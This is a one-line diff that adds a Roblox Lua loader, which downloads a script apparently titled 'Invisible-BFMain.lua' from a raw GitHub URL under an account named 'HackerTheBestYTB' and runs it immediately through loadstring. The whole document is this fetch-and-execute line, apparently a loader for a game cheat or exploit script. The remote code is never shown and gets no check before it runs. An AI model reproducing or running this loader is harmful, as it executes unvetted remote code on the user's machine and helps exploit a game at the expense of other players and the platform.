@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/HackerTheBestYTB/Script/test/Invisible-BFMain.lua")))()
